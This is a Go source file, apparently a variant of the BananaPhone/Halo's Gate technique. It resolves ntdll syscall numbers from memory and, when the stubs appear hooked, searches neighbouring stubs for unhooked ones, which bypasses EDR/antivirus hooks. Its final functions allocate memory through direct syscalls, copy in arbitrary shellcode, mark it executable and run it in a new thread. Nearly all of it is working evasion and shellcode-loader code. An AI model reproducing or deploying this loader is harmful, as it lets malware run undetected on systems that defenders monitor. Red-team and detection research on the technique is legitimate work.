package halfBanana

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/awgh/rawreader"
	"io"
	"path/filepath"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"
)

type injectionMode int

var (
	sizeofOptionalHeader32 = uint16(binary.Size(OptionalHeader32{}))
	sizeofOptionalHeader64 = uint16(binary.Size(OptionalHeader64{}))
)

const (
	OnlyMode injectionMode = iota // also known as halos gate lol
)

func (s stupidstring) String() string {
	return UTF16PtrToString(s.PWstr)
}

func Syscall(callid uint16, argh ...uintptr) (errcode uint32, err error) {
	errcode = bpSyscall(callid, argh...)

	if errcode != 0 {
		err = fmt.Errorf("non-zero return from syscall")
	}
	return errcode, err
}

func UTF16PtrToString(p *uint16) string {
	if p == nil {
		return ""
	}
	if *p == 0 {
		return ""
	}

	// Find NUL terminator.
	n := 0
	for ptr := unsafe.Pointer(p); *(*uint16)(ptr) != 0; n++ {
		ptr = unsafe.Pointer(uintptr(ptr) + unsafe.Sizeof(*p))
	}

	var s []uint16
	h := (*Slice)(unsafe.Pointer(&s))
	h.Data = unsafe.Pointer(p)
	h.Len = n
	h.Cap = n

	return string(utf16.Decode(s))
}

func bpSyscall(callid uint16, argh ...uintptr) (errcode uint32)

//GetPEB returns the in-memory address of the start of PEB while making no api calls
func GetPEB() uintptr

//GetNtdllStart returns the start address of ntdll in memory
func GetNtdllStart() (start uintptr, size uintptr)

//getModuleLoadedOrder returns the start address of module located at i in the load order. This might be useful if there is a function you need that isn't in ntdll, or if some rude individual has loaded themselves before ntdll.
func getModuleLoadedOrder(i int) (start uintptr, size uintptr, modulepath *stupidstring)

//GetModuleLoadedOrderPtr returns a pointer to the ldr data table entry in full, incase there is something interesting in there you want to see.
func GetModuleLoadedOrderPtr(i int) *LdrDataTableEntry

func GetModuleLoadedOrder(i int) (start uintptr, size uintptr, modulepath string) {
	var badstring *stupidstring
	start, size, badstring = getModuleLoadedOrder(i)
	modulepath = badstring.String()
	return
}

func InMemLoads() (map[string]Image, error) {
	ret := make(map[string]Image)
	s, si, p := GetModuleLoadedOrder(0)
	start := p
	i := 1
	ret[p] = Image{uint64(s), uint64(si)}
	for {
		s, si, p = GetModuleLoadedOrder(i)
		if p != "" {
			ret[p] = Image{uint64(s), uint64(si)}
		}
		if p == start {
			break
		}
		i++
	}

	return ret, nil
}

func NewFileFromMemory(r io.ReaderAt) (*File, error) {
	return newFileInternal(r, true)
}

func readStringTable(fh *FileHeader, r io.ReadSeeker) (StringTable, error) {
	// COFF string table is located right after COFF symbol table.
	if fh.PointerToSymbolTable <= 0 {
		return nil, nil
	}
	offset := fh.PointerToSymbolTable + 18*fh.NumberOfSymbols
	_, err := r.Seek(int64(offset), 0)
	if err != nil {
		return nil, fmt.Errorf("fail to seek to string table: %v", err)
	}
	var l uint32
	err = binary.Read(r, binary.LittleEndian, &l)
	if err != nil {
		return nil, fmt.Errorf("fail to read string table length: %v", err)
	}
	// string table length includes itself
	if l <= 4 {
		return nil, nil
	}
	l -= 4
	buf := make([]byte, l)
	_, err = io.ReadFull(r, buf)
	if err != nil {
		return nil, fmt.Errorf("fail to read string table: %v", err)
	}
	return StringTable(buf), nil
}

func readCOFFSymbols(fh *FileHeader, r io.ReadSeeker) ([]COFFSymbol, error) {
	if fh.PointerToSymbolTable == 0 {
		return nil, nil
	}
	if fh.NumberOfSymbols <= 0 {
		return nil, nil
	}
	_, err := r.Seek(int64(fh.PointerToSymbolTable), 0)
	if err != nil {
		return nil, fmt.Errorf("fail to seek to symbol table: %v", err)
	}
	syms := make([]COFFSymbol, fh.NumberOfSymbols)
	err = binary.Read(r, binary.LittleEndian, syms)
	if err != nil {
		return nil, fmt.Errorf("fail to read symbol table: %v", err)
	}
	return syms, nil
}

func removeAuxSymbols(allsyms []COFFSymbol, st StringTable) ([]*Symbol, error) {
	if len(allsyms) == 0 {
		return nil, nil
	}
	syms := make([]*Symbol, 0)
	aux := uint8(0)
	for _, sym := range allsyms {
		if aux > 0 {
			aux--
			continue
		}
		name, err := sym.FullName(st)
		if err != nil {
			return nil, err
		}
		aux = sym.NumberOfAuxSymbols
		s := &Symbol{
			Name:          name,
			Value:         sym.Value,
			SectionNumber: sym.SectionNumber,
			Type:          sym.Type,
			StorageClass:  sym.StorageClass,
		}
		syms = append(syms, s)
	}
	return syms, nil
}

func newFileInternal(r io.ReaderAt, memoryMode bool) (*File, error) {

	f := new(File)
	sr := io.NewSectionReader(r, 0, 1<<63-1)

	binary.Read(sr, binary.LittleEndian, &f.DosHeader)
	dosHeaderSize := binary.Size(f.DosHeader)
	if dosHeaderSize > int(f.DosHeader.AddressOfNewExeHeader) {
		binary.Read(sr, binary.LittleEndian, &f.DosStub)
		f.DosExists = true
	} else {
		f.DosExists = false
	}

	possibleRichHeaderStart := dosHeaderSize
	if f.DosExists {
		possibleRichHeaderStart += binary.Size(f.DosStub)
	}
	possibleRichHeaderEnd := int(f.DosHeader.AddressOfNewExeHeader)
	if possibleRichHeaderEnd > possibleRichHeaderStart {
		richHeader := make([]byte, possibleRichHeaderEnd-possibleRichHeaderStart)
		binary.Read(sr, binary.LittleEndian, richHeader)

		if richIndex := bytes.Index(richHeader, []byte("Rich")); richIndex != -1 {
			f.RichHeader = richHeader[:richIndex+8]
		}
	}

	var peHeaderOffset int64
	if f.DosHeader.MZSignature == 0x5a4d {
		peHeaderOffset = int64(f.DosHeader.AddressOfNewExeHeader)
		var sign [4]byte
		r.ReadAt(sign[:], peHeaderOffset)
		if !(sign[0] == 'P' && sign[1] == 'E' && sign[2] == 0 && sign[3] == 0) {
			return nil, fmt.Errorf("Invalid PE COFF file signature of %v.", sign)
		}
		peHeaderOffset += int64(4)
	} else {
		peHeaderOffset = int64(0)
	}

	sr.Seek(peHeaderOffset, 0)
	if err := binary.Read(sr, binary.LittleEndian, &f.FileHeader); err != nil {
		return nil, err
	}
	switch f.FileHeader.Machine {
	case IMAGE_FILE_MACHINE_UNKNOWN, IMAGE_FILE_MACHINE_ARMNT, IMAGE_FILE_MACHINE_AMD64, IMAGE_FILE_MACHINE_I386:
	default:
		return nil, fmt.Errorf("Unrecognised COFF file header machine value of 0x%x.", f.FileHeader.Machine)
	}

	var err error

	// Read string table.
	f.StringTable, err = readStringTable(&f.FileHeader, sr)
	if err != nil {
		return nil, err
	}

	// Read symbol table.
	f.COFFSymbols, err = readCOFFSymbols(&f.FileHeader, sr)
	if err != nil {
		return nil, err
	}
	f.Symbols, err = removeAuxSymbols(f.COFFSymbols, f.StringTable)
	if err != nil {
		return nil, err
	}

	// Read optional header.
	sr.Seek(peHeaderOffset+int64(binary.Size(f.FileHeader)), 0)

	var oh32 OptionalHeader32
	var oh64 OptionalHeader64
	switch f.FileHeader.SizeOfOptionalHeader {
	case sizeofOptionalHeader32:
		if err := binary.Read(sr, binary.LittleEndian, &oh32); err != nil {
			return nil, err
		}
		if oh32.Magic != 0x10b { // PE32
			return nil, fmt.Errorf("pe32 optional header has unexpected Magic of 0x%x", oh32.Magic)
		}
		f.OptionalHeader = &oh32
	case sizeofOptionalHeader64:
		if err := binary.Read(sr, binary.LittleEndian, &oh64); err != nil {
			return nil, err
		}
		if oh64.Magic != 0x20b { // PE32+
			return nil, fmt.Errorf("pe32+ optional header has unexpected Magic of 0x%x", oh64.Magic)
		}
		f.OptionalHeader = &oh64
	}

	// Process sections.
	f.Sections = make([]*Section, f.FileHeader.NumberOfSections)
	for i := 0; i < int(f.FileHeader.NumberOfSections); i++ {
		sh := new(SectionHeader32)
		if err := binary.Read(sr, binary.LittleEndian, sh); err != nil {
			return nil, err
		}
		name, err := sh.fullName(f.StringTable)
		if err != nil {
			return nil, err
		}
		s := new(Section)
		s.SectionHeader = SectionHeader{
			Name:                 name,
			OriginalName:         sh.Name,
			VirtualSize:          sh.VirtualSize,
			VirtualAddress:       sh.VirtualAddress,
			Size:                 sh.SizeOfRawData,
			Offset:               sh.PointerToRawData,
			PointerToRelocations: sh.PointerToRelocations,
			PointerToLineNumbers: sh.PointerToLineNumbers,
			NumberOfRelocations:  sh.NumberOfRelocations,
			NumberOfLineNumbers:  sh.NumberOfLineNumbers,
			Characteristics:      sh.Characteristics,
		}
		r2 := r
		if sh.PointerToRawData == 0 { // .bss must have all 0s
			r2 = zeroReaderAt{}
		}
		if !memoryMode {
			s.sr = io.NewSectionReader(r2, int64(s.SectionHeader.Offset), int64(s.SectionHeader.Size))
		} else {
			s.sr = io.NewSectionReader(r2, int64(s.SectionHeader.VirtualAddress), int64(s.SectionHeader.Size))
		}
		s.ReaderAt = s.sr
		f.Sections[i] = s
	}
	for i := range f.Sections {
		var err error
		f.Sections[i].Relocs, err = readRelocs(&f.Sections[i].SectionHeader, sr)
		if err != nil {
			return nil, err
		}
	}

	// Read certificate table
	f.CertificateTable, err = readCertTable(f, sr)
	if err != nil {
		return nil, err
	}

	return f, nil
}

func (s *Section) Data() ([]byte, error) {

	if s.sr == nil { // This section was added from code, the internal SectionReader is nil
		return nil, nil
	}

	dat := make([]byte, s.sr.Size())
	n, err := s.sr.ReadAt(dat, 0)
	if n == len(dat) {
		err = nil
	}
	return dat[0:n], err
}

func getString(section []byte, start int) (string, bool) {
	if start < 0 || start >= len(section) {
		return "", false
	}

	for end := start; end < len(section); end++ {
		if section[end] == 0 {
			return string(section[start:end]), true
		}
	}
	return "", false
}

func getNTDLLBaseAddr() (*baseStruct, error) {
	var bp = &baseStruct{}
	var p *File
	var e error
	var diskpath = `C:\Windows\system32\ntdll.dll`
	var name = `ntdll.dll`

	loads, err := InMemLoads()
	if err != nil {
		return nil, err
	}
	found := false
	for k, load := range loads { //shout out to Frank Reynolds
		if strings.EqualFold(k, diskpath) || strings.EqualFold(name, filepath.Base(k)) {
			rr := rawreader.New(uintptr(load.BaseAddr), int(load.Size))
			p, e = NewFileFromMemory(rr)
			bp.memloc = uintptr(load.BaseAddr)
			found = true
			break
		}
	}
	if !found {
		return nil, fmt.Errorf("module not found, bad times (%s %s)", diskpath, filepath.Base(diskpath))
	}
	bp.filePe = p
	bp.mode = OnlyMode
	return bp, e
}

func (f *File) Exports() ([]Export, error) {
	pe64 := f.Machine == IMAGE_FILE_MACHINE_AMD64

	// grab the number of data directory entries
	var ddLength uint32
	if pe64 {
		ddLength = f.OptionalHeader.(*OptionalHeader64).NumberOfRvaAndSizes
	} else {
		ddLength = f.OptionalHeader.(*OptionalHeader32).NumberOfRvaAndSizes
	}

	// check that the length of data directory entries is large
	// enough to include the exports directory.
	if ddLength < 0+1 {
		return nil, nil
	}

	// grab the export data directory entry
	var edd DataDirectory
	if pe64 {
		edd = f.OptionalHeader.(*OptionalHeader64).DataDirectory[0]
	} else {
		edd = f.OptionalHeader.(*OptionalHeader32).DataDirectory[0]
	}

	// figure out which section contains the export directory table
	var ds *Section
	ds = nil
	for _, s := range f.Sections {
		if s.VirtualAddress <= edd.VirtualAddress && edd.VirtualAddress < s.VirtualAddress+s.VirtualSize {
			ds = s
			break
		}
	}

	// didn't find a section, so no exports were found
	if ds == nil {
		return nil, nil
	}

	d, err := ds.Data()
	if err != nil {
		return nil, err
	}

	exportDirOffset := edd.VirtualAddress - ds.VirtualAddress

	// seek to the virtual address specified in the export data directory
	dxd := d[exportDirOffset:]

	// deserialize export directory
	var dt ExportDirectory
	dt.ExportFlags = binary.LittleEndian.Uint32(dxd[0:4])
	dt.TimeDateStamp = binary.LittleEndian.Uint32(dxd[4:8])
	dt.MajorVersion = binary.LittleEndian.Uint16(dxd[8:10])
	dt.MinorVersion = binary.LittleEndian.Uint16(dxd[10:12])
	dt.NameRVA = binary.LittleEndian.Uint32(dxd[12:16])
	dt.OrdinalBase = binary.LittleEndian.Uint32(dxd[16:20])
	dt.NumberOfFunctions = binary.LittleEndian.Uint32(dxd[20:24])
	dt.NumberOfNames = binary.LittleEndian.Uint32(dxd[24:28])
	dt.AddressTableAddr = binary.LittleEndian.Uint32(dxd[28:32])
	dt.NameTableAddr = binary.LittleEndian.Uint32(dxd[32:36])
	dt.OrdinalTableAddr = binary.LittleEndian.Uint32(dxd[36:40])

	dt.DllName, _ = getString(d, int(dt.NameRVA-ds.VirtualAddress))

	// seek to ordinal table
	dno := d[dt.OrdinalTableAddr-ds.VirtualAddress:]
	// seek to names table
	dnn := d[dt.NameTableAddr-ds.VirtualAddress:]

	// build whole ordinal->name table
	ordinalTable := make(map[uint16]uint32)
	for n := uint32(0); n < dt.NumberOfNames; n++ {
		ord := binary.LittleEndian.Uint16(dno[n*2 : (n*2)+2])
		nameRVA := binary.LittleEndian.Uint32(dnn[n*4 : (n*4)+4])
		ordinalTable[ord] = nameRVA
	}
	dno = nil
	dnn = nil

	// seek to ordinal table
	dna := d[dt.AddressTableAddr-ds.VirtualAddress:]

	var exports []Export
	for i := uint32(0); i < dt.NumberOfFunctions; i++ {
		var export Export
		export.VirtualAddress =
			binary.LittleEndian.Uint32(dna[i*4 : (i*4)+4])
		export.Ordinal = dt.OrdinalBase + i

		// check the entire ordinal table looking for this index to see if we have a name
		_, ok := ordinalTable[uint16(i)]
		if ok { // a name exists for this exported function
			nameRVA, _ := ordinalTable[uint16(i)]
			export.Name, _ = getString(d, int(nameRVA-ds.VirtualAddress))
		}
		exports = append(exports, export)
	}
	return exports, nil
}

func rvaToOffset(pefile *File, rva uint32) uint32 {
	for _, hdr := range pefile.Sections {
		baseoffset := uint64(rva)
		if baseoffset > uint64(hdr.VirtualAddress) &&
			baseoffset < uint64(hdr.VirtualAddress+hdr.VirtualSize) {
			return rva - hdr.VirtualAddress + hdr.Offset
		}
	}
	return rva
}

func (peFile *File) Bytes() ([]byte, error) {
	var bytesWritten uint64
	peBuf := bytes.NewBuffer(nil)

	// write DOS header and stub
	binary.Write(peBuf, binary.LittleEndian, peFile.DosHeader)
	bytesWritten += uint64(binary.Size(peFile.DosHeader))
	if peFile.DosExists {
		binary.Write(peBuf, binary.LittleEndian, peFile.DosStub)
		bytesWritten += uint64(binary.Size(peFile.DosStub))
	}

	// write Rich header
	if peFile.RichHeader != nil {
		binary.Write(peBuf, binary.LittleEndian, peFile.RichHeader)
		bytesWritten += uint64(len(peFile.RichHeader))
	}

	// apply padding before PE header if necessary
	if uint32(bytesWritten) != peFile.DosHeader.AddressOfNewExeHeader {
		padding := make([]byte, peFile.DosHeader.AddressOfNewExeHeader-uint32(bytesWritten))
		binary.Write(peBuf, binary.LittleEndian, padding)
		bytesWritten += uint64(len(padding))
	}

	// write PE header
	peMagic := []byte{'P', 'E', 0x00, 0x00}
	binary.Write(peBuf, binary.LittleEndian, peMagic)
	binary.Write(peBuf, binary.LittleEndian, peFile.FileHeader)
	bytesWritten += uint64(binary.Size(peFile.FileHeader) + len(peMagic))

	var (
		is32bit                              bool
		oldCertTableOffset, oldCertTableSize uint32
	)

	switch peFile.FileHeader.Machine {
	case IMAGE_FILE_MACHINE_I386:
		is32bit = true
		optionalHeader := peFile.OptionalHeader.(*OptionalHeader32)
		binary.Write(peBuf, binary.LittleEndian, peFile.OptionalHeader.(*OptionalHeader32))
		bytesWritten += uint64(binary.Size(optionalHeader))

		oldCertTableOffset = optionalHeader.DataDirectory[CERTIFICATE_TABLE].VirtualAddress
		oldCertTableSize = optionalHeader.DataDirectory[CERTIFICATE_TABLE].Size
	case IMAGE_FILE_MACHINE_AMD64:
		is32bit = false
		optionalHeader := peFile.OptionalHeader.(*OptionalHeader64)
		binary.Write(peBuf, binary.LittleEndian, optionalHeader)
		bytesWritten += uint64(binary.Size(optionalHeader))

		oldCertTableOffset = optionalHeader.DataDirectory[CERTIFICATE_TABLE].VirtualAddress
		oldCertTableSize = optionalHeader.DataDirectory[CERTIFICATE_TABLE].Size
	default:
		return nil, errors.New("architecture not supported")
	}

	// write section headers
	sectionHeaders := make([]SectionHeader32, len(peFile.Sections))
	for idx, section := range peFile.Sections {
		// write section header
		sectionHeader := SectionHeader32{
			Name:                 section.OriginalName,
			VirtualSize:          section.VirtualSize,
			VirtualAddress:       section.VirtualAddress,
			SizeOfRawData:        section.Size,
			PointerToRawData:     section.Offset,
			PointerToRelocations: section.PointerToRelocations,
			PointerToLineNumbers: section.PointerToLineNumbers,
			NumberOfRelocations:  section.NumberOfRelocations,
			NumberOfLineNumbers:  section.NumberOfLineNumbers,
			Characteristics:      section.Characteristics,
		}
		sectionHeaders[idx] = sectionHeader

		//log.Printf("section: %+v\nsectionHeader: %+v\n", section, sectionHeader)

		binary.Write(peBuf, binary.LittleEndian, sectionHeader)
		bytesWritten += uint64(binary.Size(sectionHeader))
	}

	// write sections' data
	for idx, sectionHeader := range sectionHeaders {
		section := peFile.Sections[idx]
		sectionData, err := section.Data()
		if err != nil {
			return nil, err
		}
		if sectionData == nil { // for sections that weren't in the original file
			sectionData = []byte{}
		}
		if section.Offset != 0 && bytesWritten < uint64(section.Offset) {
			pad := make([]byte, uint64(section.Offset)-bytesWritten)
			peBuf.Write(pad)
			//log.Printf("Padding before section %s at %x: length:%x to:%x\n", section.Name, bytesWritten, len(pad), section.Offset)
			bytesWritten += uint64(len(pad))
		}
		// if our shellcode insertion address is inside this section, insert it at the correct offset in sectionData
		if peFile.InsertionAddr >= section.Offset && int64(peFile.InsertionAddr) < (int64(section.Offset)+int64(section.Size)-int64(len(peFile.InsertionBytes))) {
			sectionData = append(sectionData, peFile.InsertionBytes[:]...)
			datalen := len(sectionData)
			if sectionHeader.SizeOfRawData > uint32(datalen) {
				paddingSize := sectionHeader.SizeOfRawData - uint32(datalen)
				padding := make([]byte, paddingSize, paddingSize)
				sectionData = append(sectionData, padding...)
				//log.Printf("Padding after section %s: length:%d\n", section.Name, paddingSize)
			}
		}

		binary.Write(peBuf, binary.LittleEndian, sectionData)
		bytesWritten += uint64(len(sectionData))
	}

	// write symbols
	binary.Write(peBuf, binary.LittleEndian, peFile.COFFSymbols)
	bytesWritten += uint64(binary.Size(peFile.COFFSymbols))

	// write the string table
	binary.Write(peBuf, binary.LittleEndian, peFile.StringTable)
	bytesWritten += uint64(binary.Size(peFile.StringTable))

	var newCertTableOffset, newCertTableSize uint32

	// write the certificate table
	if peFile.CertificateTable != nil {
		newCertTableOffset = uint32(bytesWritten)
		newCertTableSize = uint32(len(peFile.CertificateTable))
	} else {
		newCertTableOffset = 0
		newCertTableSize = 0
	}

	binary.Write(peBuf, binary.LittleEndian, peFile.CertificateTable)
	bytesWritten += uint64(len(peFile.CertificateTable))

	peData := peBuf.Bytes()

	// write the offset and size of the new Certificate Table if it changed
	if newCertTableOffset != oldCertTableOffset || newCertTableSize != oldCertTableSize {
		certTableInfo := &DataDirectory{
			VirtualAddress: newCertTableOffset,
			Size:           newCertTableSize,
		}

		var certTableInfoBuf bytes.Buffer
		binary.Write(&certTableInfoBuf, binary.LittleEndian, certTableInfo)

		var certTableLoc int64
		if is32bit {
			certTableLoc = int64(peFile.DosHeader.AddressOfNewExeHeader) + 24 + 128
		} else {
			certTableLoc = int64(peFile.DosHeader.AddressOfNewExeHeader) + 24 + 144
		}

		peData = append(peData[:certTableLoc], append(certTableInfoBuf.Bytes(), peData[int(certTableLoc)+binary.Size(certTableInfo):]...)...)
	}

	return peData, nil
}

func (e MayBeHookedError) Error() string {
	return fmt.Sprintf("may be hooked: wanted %x got %x", HookCheck, e.Foundbytes)
}

//SUPER IMPORTANT: THESE ARE THE BYTES THAT HALOS GATE USES TO CHECK IF THE API IS HOOKED. IT WILL VARY DEPENDING ON EDR/AV AND MIGHT NEED TO BE EDITED.
var HookCheck = []byte{0x4c, 0x8b, 0xd1, 0xb8}

func sysIDFromRawBytes(b []byte) (uint16, error) {

	if !bytes.HasPrefix(b, HookCheck) {
		return 0, MayBeHookedError{Foundbytes: b}
	}
	return binary.LittleEndian.Uint16(b[4:8]), nil
}

func getSysID(baseStruct *baseStruct, funcname string, ord uint32, useOrd, useneighbor bool) (uint16, error) {
	ex, e := baseStruct.filePe.Exports()
	if e != nil {
		return 0, e
	}

	for _, exp := range ex {
		if (useOrd && exp.Ordinal == ord) || // many bothans died for this feature (thanks awgh). Turns out that a value can be exported by ordinal, but not by name! man I love PE files. ha ha jk.
			exp.Name == funcname {
			offset := rvaToOffset(baseStruct.filePe, exp.VirtualAddress)
			bBytes, e := baseStruct.filePe.Bytes()
			if e != nil {
				return 0, e
			}
			buff := bBytes[offset : offset+10]

			sysId, e := sysIDFromRawBytes(buff)
			var err MayBeHookedError
			// Look for the syscall ID in the neighborhood
			if errors.As(e, &err) && useneighbor {
				// big thanks to @nodauf for implementing the halos gate logic
				start, size := GetNtdllStart()
				distanceNeighbor := 0
				// Search forward
				for i := uintptr(offset); i < start+size; i += 1 {
					if bBytes[i] == byte('\x0f') && bBytes[i+1] == byte('\x05') && bBytes[i+2] == byte('\xc3') {
						distanceNeighbor++
						// The sysid should be located 14 bytes after the syscall; ret instruction.
						sysId, e := sysIDFromRawBytes(bBytes[i+14 : i+14+8])
						if !errors.As(e, &err) {
							return sysId - uint16(distanceNeighbor), e
						}
					}
				}
				// reset the value to 1. When we go forward we catch the current syscall; ret but not when we go backward, so distanceNeighboor = 0 for forward and distanceNeighboor = 1 for backward
				distanceNeighbor = 1
				// If nothing has been found forward, search backward
				for i := uintptr(offset) - 1; i > 0; i -= 1 {
					if bBytes[i] == byte('\x0f') && bBytes[i+1] == byte('\x05') && bBytes[i+2] == byte('\xc3') {
						distanceNeighbor++
						// The sysid should be located 14 bytes after the syscall; ret instruction.
						sysId, e := sysIDFromRawBytes(bBytes[i+14 : i+14+8])
						if !errors.As(e, &err) {
							return sysId + uint16(distanceNeighbor) - 1, e
						}
					}
				}
			} else {
				return sysId, e
			}
		}
	}
	return 0, errors.New("could not find syscall ID")
}

func GetSysID(baseStruct *baseStruct, funcname string) (uint16, error) {
	useneighbor := true
	r, e := getSysID(baseStruct, funcname, 0, false, useneighbor)
	if e != nil {
		var err MayBeHookedError
		// error is some other error besides an indicator that we are being hooked
		if !errors.Is(e, &err) {
			return r, e
		}

		//SUPER IMPORTANT: DECOMMENT THESE FOLLOWING LINES IF WE WANT A FALLBACK TO LOAD NTDLL FROM DISK IF WE THINK ITS HOOKED AND CANT FIND ANYTHING
		//fall back to disk only if in auto mode
		/*if baseStruct.mode == AutoBananaPhoneMode {
			var e2 error
			b.banana, e2 = pe.Open(`C:\Windows\system32\ntdll.dll`)
			if e2 != nil {
				return 0, e2
			}
			r, e = b.getSysID(funcname, 0, false, false) //using disk mode her
		}*/
	}
	return r, e
}

func WriteMemory(inbuf []byte, destination uintptr) {
	for index := uint32(0); index < uint32(len(inbuf)); index++ {
		writePtr := unsafe.Pointer(destination + uintptr(index))
		v := (*byte)(writePtr)
		*v = inbuf[index]
	}
}

func RunShellCodeCreateThreadHalosGate(shellcode []byte) {
	var ntdlllife, _ = getNTDLLBaseAddr()

	NtAllocateVirtualMemorySysid, _ := GetSysID(ntdlllife, "NtAllocateVirtualMemory")
	NtProtectVirtualMemorySysid, _ := GetSysID(ntdlllife, "NtProtectVirtualMemory")
	NtCreateThreadExSysid, _ := GetSysID(ntdlllife, "NtCreateThreadEx")

	handle := uintptr(0xffffffffffffffff)
	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	//write memory
	WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	r1, r = Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func WriteShellCodeToMemory(shellcode []byte) uintptr {
	var shellAddr uintptr

	var ntdlllife, _ = getNTDLLBaseAddr()

	NtAllocateVirtualMemorySysid, _ := GetSysID(ntdlllife, "NtAllocateVirtualMemory")
	NtProtectVirtualMemorySysid, _ := GetSysID(ntdlllife, "NtProtectVirtualMemory")

	handle := uintptr(0xffffffffffffffff)
	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	regionsize := uintptr(len(shellcode))
	r1, r := Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&shellAddr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return 0
	}
	//write memory
	WriteMemory(shellcode, shellAddr)

	var oldprotect uintptr
	r1, r = Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&shellAddr)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return 0
	}

	return shellAddr
}
